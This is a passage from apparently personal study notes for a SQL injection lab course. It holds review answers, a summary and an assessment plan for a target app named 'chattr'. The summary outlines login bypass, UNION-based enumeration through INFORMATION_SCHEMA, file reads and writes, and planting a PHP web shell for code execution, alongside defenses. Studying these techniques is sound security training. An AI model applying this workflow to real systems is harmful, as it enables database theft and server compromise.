   User input is bound as data to placeholders rather than concatenated into the query text, so it structurally cannot alter the query's syntax, regardless of its content.
9. **Why should a web application never connect to the database as a superuser/admin account?**
   If the app is compromised (e.g. via SQLi), the attacker inherits whatever privileges that DB account has; a least-privilege account limits the damage to only what the app actually needs.
10. **Why must you check `secure_file_priv` before attempting to write a file, even if the user has the FILE privilege?**
    `secure_file_priv` can independently restrict or completely block file read/write regardless of user privileges — an empty value allows it anywhere, a set path restricts it to that folder, and `NULL` blocks it entirely.

### 6.5 Two-Minute Final Summary

SQL injection happens when user input reaches a SQL query unsanitized, letting an attacker change its logic. The basic mechanics are: break out of the input boundary (often with a quote), keep the resulting SQL syntactically valid (via an even number of quotes or comments), and read the output.

Simple logic-subversion techniques — abusing `OR` with operator precedence, or using `--`/`#` comments to truncate the rest of a query — are enough to bypass authentication on a typical login form.

Union-based injection goes further: after confirming injectability, you find the real query's column count (`ORDER BY` or incrementing `UNION SELECT`), identify which columns actually render on the page, and confirm real data flows through with `@@version`. From there, `INFORMATION_SCHEMA` lets you enumerate databases (`SCHEMATA`), tables (`TABLES`), and columns (`COLUMNS`) without needing source-code access, culminating in a direct data dump — using the dot operator when crossing databases.

Beyond reading data, SQLi can read files (`LOAD_FILE()`) or write them (`INTO OUTFILE`), provided the DB user has the FILE privilege and (for writes) `secure_file_priv` and OS permissions allow it. Writing a PHP web shell into the webroot can escalate SQLi all the way to remote code execution.

Defense is layered: sanitize and validate all input, run the app under a least-privilege DB account, deploy a WAF, and — most robustly — use parameterized queries so user input is always treated as data, never as part of the query's structure. No single measure is a complete guarantee; application logic can still introduce gaps.

---

## 7. Skills Assessment: Approach Only

The assessment is a black-box SQLi test of a login application ("chattr"), using Burp Suite (via its built-in browser or an installed CA certificate + FoxyProxy) to intercept HTTPS traffic. These notes contain no answers. Apply the workflow in §4: discover an injectable parameter, fingerprint the DBMS, determine the injection type available to you, and proceed through enumeration (or authentication bypass, depending on what the app exposes) using the payload patterns in §3.
